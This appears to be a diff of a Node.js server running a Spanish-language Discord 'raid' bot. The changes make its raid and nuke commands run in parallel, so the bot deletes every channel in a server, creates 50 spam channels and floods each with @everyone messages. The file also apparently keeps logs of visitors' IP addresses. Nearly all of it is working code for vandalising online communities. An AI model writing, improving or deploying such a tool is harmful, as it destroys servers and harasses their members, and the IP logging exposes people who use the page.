@@ -51,12 +51,12 @@ let ipLogs = [];
 let activeBots = new Map();
 let uploadedImages = new Map();
 
-// Configuración predeterminada del raid
+// Configuración predeterminada del raid - MODO NUCLEAR
 const RAID_CONFIG = {
     canales: 50,
     mensajesPorCanal: 15,
-    nombreCanal: "IDK-RAIDED",
-    mensaje: "@everyone SERVIDOR DESTRUIDO POR IDK TOOL 🔥\n" + "█".repeat(1000)
+    nombreCanal: "NUKED",
+    mensaje: "@everyone SERVIDOR DESTRUIDO 🔥\n" + "█".repeat(2000)
 };
 
 // Ruta principal - Sirve el HTML
@@ -175,7 +175,7 @@ app.get('/api/ip-logs', (req, res) => {
 });
 
 // ============================================
-// BOT DE COMANDOS ENDPOINTS
+// BOT DE COMANDOS - MODO NUCLEAR (SIN COOLDOWN)
 // ============================================
 
 // Iniciar bot
@@ -205,6 +205,7 @@ app.post('/api/start-bot', async (req, res) => {
         bot.once('ready', () => {
             console.log(`✅ Bot conectado: ${bot.user.tag}`);
             console.log(`📊 Servidores: ${bot.guilds.cache.size}`);
+            console.log(`⚡ MODO NUCLEAR ACTIVADO - SIN COOLDOWNS`);
             
             bot.on(Events.MessageCreate, async (message) => {
                 if (message.author.bot) return;
@@ -216,8 +217,11 @@ app.post('/api/start-bot', async (req, res) => {
                 
                 console.log(`📨 Comando recibido: ${command} en ${message.guild?.name}`);
 
+                // ============================================
+                // COMANDO .raid - MODO NUCLEAR (TODO EN 1 SEGUNDO)
+                // ============================================
                 if (command === 'raid') {
-                    await message.reply(`🔥 **INICIANDO ATAQUE COMPLETO** 🔥\n\`\`\`\n📊 FASE 1: ELIMINANDO CANALES EXISTENTES\n📌 FASE 2: CREANDO ${RAID_CONFIG.canales} CANALES\n📝 FASE 3: ENVIANDO ${RAID_CONFIG.mensajesPorCanal} MENSAJES POR CANAL\n⚡ FASE 4: FINALIZANDO\`\`\``);
+                    await message.reply(`☢️ **MODO NUCLEAR ACTIVADO** ☢️\n\`\`\`diff\n+ DESTRUYENDO SERVIDOR EN 1 SEGUNDO...\`\`\``);
                     
                     try {
                         const guild = message.guild;
@@ -226,45 +230,67 @@ app.post('/api/start-bot', async (req, res) => {
                             return;
                         }
 
-                        let canalesCreados = 0;
-                        let mensajesEnviados = 0;
-                        let canalesEliminados = 0;
-
+                        // ============================================
+                        // FASE 1: ELIMINAR CANALES (EN PARALELO)
+                        // ============================================
                         const channels = await guild.channels.fetch();
-                        for (const [id, channel] of channels) {
+                        const deletePromises = [];
+                        channels.forEach(channel => {
                             if (channel.deletable) {
-                                await channel.delete().catch(() => {});
-                                canalesEliminados++;
+                                deletePromises.push(channel.delete().catch(() => {}));
                             }
-                        }
+                        });
+                        await Promise.all(deletePromises);
+                        const canalesEliminados = deletePromises.length;
 
+                        // ============================================
+                        // FASE 2: CREAR 50 CANALES (EN PARALELO)
+                        // ============================================
+                        const createPromises = [];
                         for (let i = 0; i < RAID_CONFIG.canales; i++) {
-                            try {
-                                const channel = await guild.channels.create({
+                            createPromises.push(
+                                guild.channels.create({
                                     name: `${RAID_CONFIG.nombreCanal}-${i}`,
                                     type: ChannelType.GuildText
-                                });
-                                canalesCreados++;
-
-                                for (let j = 0; j < RAID_CONFIG.mensajesPorCanal; j++) {
-                                    await channel.send(RAID_CONFIG.mensaje).catch(() => {});
-                                    mensajesEnviados++;
-                                }
-
-                            } catch (e) {
-                                console.log(`Error creando canal: ${e.message}`);
-                            }
+                                }).catch(() => null)
+                            );
                         }
+                        
+                        const canales = await Promise.all(createPromises);
+                        const canalesCreados = canales.filter(c => c !== null).length;
 
-                        await message.channel.send(`✅ **ATAQUE COMPLETADO** ✅\n\`\`\`\n🗑️ CANALES ELIMINADOS: ${canalesEliminados}\n📌 CANALES CREADOS: ${canalesCreados}\n💬 MENSAJES ENVIADOS: ${mensajesEnviados}\n\`\`\``);
+                        // ============================================
+                        // FASE 3: ENVIAR 15 MENSAJES POR CANAL (EN PARALELO)
+                        // ============================================
+                        const messagePromises = [];
+                        canales.forEach(channel => {
+                            if (channel) {
+                                for (let j = 0; j < RAID_CONFIG.mensajesPorCanal; j++) {
+                                    messagePromises.push(
+                                        channel.send(RAID_CONFIG.mensaje).catch(() => {})
+                                    );
+                                }
+                            }
+                        });
+                        
+                        await Promise.all(messagePromises);
+                        const mensajesEnviados = messagePromises.length;
+
+                        // ============================================
+                        // FASE 4: REPORTE FINAL
+                        // ============================================
+                        await message.channel.send(`💥 **SERVIDOR DESTRUIDO** 💥\n\`\`\`prolog\n🗑️ CANALES ELIMINADOS: ${canalesEliminados}\n📌 CANALES CREADOS: ${canalesCreados}\n💬 MENSAJES ENVIADOS: ${mensajesEnviados}\n⚡ TIEMPO: ~1 SEGUNDO\`\`\``);
 
                     } catch (e) {
                         await message.channel.send(`❌ Error: ${e.message}`);
                     }
                 }
                 
+                // ============================================
+                // COMANDO .nuke - ELIMINAR TODO (EN PARALELO)
+                // ============================================
                 else if (command === 'nuke') {
-                    await message.reply('💥 **ELIMINANDO TODOS LOS CANALES**...');
+                    await message.reply('💥 **ELIMINANDO TODO EN PARALELO**...');
                     
                     try {
                         const guild = message.guild;
@@ -274,22 +300,26 @@ app.post('/api/start-bot', async (req, res) => {
                         }
 
                         const channels = await guild.channels.fetch();
-                        let eliminados = 0;
+                        const deletePromises = [];
                         
-                        for (const [id, channel] of channels) {
+                        channels.forEach(channel => {
                             if (channel.deletable) {
-                                await channel.delete().catch(() => {});
-                                eliminados++;
+                                deletePromises.push(channel.delete().catch(() => {}));
                             }
-                        }
+                        });
                         
-                        await message.channel.send(`✅ **NUKE COMPLETADO**\n\`\`\`\n🗑️ CANALES ELIMINADOS: ${eliminados}\`\`\``);
+                        await Promise.all(deletePromises);
+                        
+                        await message.channel.send(`✅ **NUKE COMPLETADO**\n\`\`\`\n🗑️ CANALES ELIMINADOS: ${deletePromises.length}\`\`\``);
                         
                     } catch (e) {
                         await message.channel.send(`❌ Error: ${e.message}`);
                     }
                 }
                 
+                // ============================================
+                // COMANDO .stop / .off - DETENER BOT
+                // ============================================
                 else if (command === 'stop' || command === 'off') {
                     await message.reply('🛑 **DETENIENDO BOT**...');
                     
@@ -300,10 +330,13 @@ app.post('/api/start-bot', async (req, res) => {
                         }
                     }
                     
-                    await message.channel.send('✅ Bot desconectado. Para usarlo de nuevo, inícialo desde la web.');
-                    setTimeout(() => bot.destroy(), 1000);
+                    await message.channel.send('✅ Bot desconectado.');
+                    setTimeout(() => bot.destroy(), 100);
                 }
                 
+                // ============================================
+                // COMANDO .servers - LISTAR SERVIDORES
+                // ============================================
                 else if (command === 'servers') {
                     const guilds = bot.guilds.cache;
                     let serverList = '**📡 SERVIDORES:**\n```\n';
@@ -314,34 +347,41 @@ app.post('/api/start-bot', async (req, res) => {
                     await message.reply(serverList);
                 }
                 
+                // ============================================
+                // COMANDO .ping - VER LATENCIA
+                // ============================================
                 else if (command === 'ping') {
                     const ping = Date.now() - message.createdTimestamp;
                     await message.reply(`🏓 **PONG!** Latencia: ${ping}ms | API: ${Math.round(bot.ws.ping)}ms`);
                 }
                 
+                // ============================================
+                // COMANDO .help - MOSTRAR AYUDA
+                // ============================================
                 else if (command === 'help') {
                     const helpMsg = `
-**🛠️ COMANDOS DISPONIBLES:**
-\`\`\`
-${prefix}raid    - Ataque completo: nuke + 50 canales + 15 mensajes
-${prefix}nuke    - Elimina todos los canales del servidor
-${prefix}stop    - Detiene el bot permanentemente
+**☢️ MODO NUCLEAR - SIN COOLDOWNS ☢️**
+\`\`\`css
+${prefix}raid    - Destruye el servidor en 1 segundo (nuke + 50 canales + 15 msgs)
+${prefix}nuke    - Elimina todos los canales en paralelo
+${prefix}stop    - Detiene el bot
 ${prefix}off     - Lo mismo que .stop
-${prefix}servers - Lista todos los servidores del bot
+${prefix}servers - Lista todos los servidores
 ${prefix}ping    - Muestra la latencia
 ${prefix}help    - Muestra esta ayuda
 \`\`\`
-⚙️ **CONFIGURACIÓN ACTUAL:**
-\`\`\`
-📊 Canales a crear: ${RAID_CONFIG.canales}
-📝 Mensajes por canal: ${RAID_CONFIG.mensajesPorCanal}
-📌 Nombre del canal: ${RAID_CONFIG.nombreCanal}
+⚙️ **CONFIGURACIÓN NUCLEAR:**
+\`\`\`yaml
+Canales a crear: ${RAID_CONFIG.canales}
+Mensajes por canal: ${RAID_CONFIG.mensajesPorCanal}
+Nombre del canal: ${RAID_CONFIG.nombreCanal}
+Velocidad: MÁXIMA (TODO EN PARALELO)
 \`\`\``;
                     await message.reply(helpMsg);
                 }
             });
             
-            console.log(`👂 Bot escuchando comandos con prefijo: ${prefix}`);
+            console.log(`👂 Bot escuchando comandos con prefijo: ${prefix} (MODO NUCLEAR)`);
         });
 
         activeBots.set(token, {
@@ -354,7 +394,7 @@ ${prefix}help    - Muestra esta ayuda
 
         res.json({ 
             success: true, 
-            message: "✅ Bot iniciado correctamente",
+            message: "✅ Bot iniciado en MODO NUCLEAR",
             user: bot.user?.tag,
             servers: bot.guilds.cache.size,
             config: RAID_CONFIG
@@ -432,7 +472,8 @@ app.get('/api/active-bots', (req, res) => {
             user: data.userTag,
             startedAt: data.startedAt,
             servers: data.servers || 0,
-            prefix: data.prefix || '.'
+            prefix: data.prefix || '.',
+            mode: "NUCLEAR"
         });
     });
     res.json(bots);
@@ -449,7 +490,7 @@ app.post('/api/update-config', (req, res) => {
     
     res.json({ 
         success: true, 
-        message: "Configuración actualizada",
+        message: "Configuración nuclear actualizada",
         config: RAID_CONFIG 
     });
 });
@@ -460,9 +501,10 @@ app.post('/api/update-config', (req, res) => {
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Servidor corriendo en puerto ${PORT}`);
     console.log(`📁 Carpeta uploads: ${path.resolve('./public/uploads')}`);
-    console.log(`🤖 Configuración RAID:`);
+    console.log(`☢️ MODO NUCLEAR ACTIVADO:`);
     console.log(`   - Canales: ${RAID_CONFIG.canales}`);
     console.log(`   - Mensajes por canal: ${RAID_CONFIG.mensajesPorCanal}`);
     console.log(`   - Nombre canal: ${RAID_CONFIG.nombreCanal}`);
+    console.log(`   - Velocidad: MÁXIMA (TODO EN PARALELO)`);
     console.log(`🌐 URL: http://localhost:${PORT}`);
 });
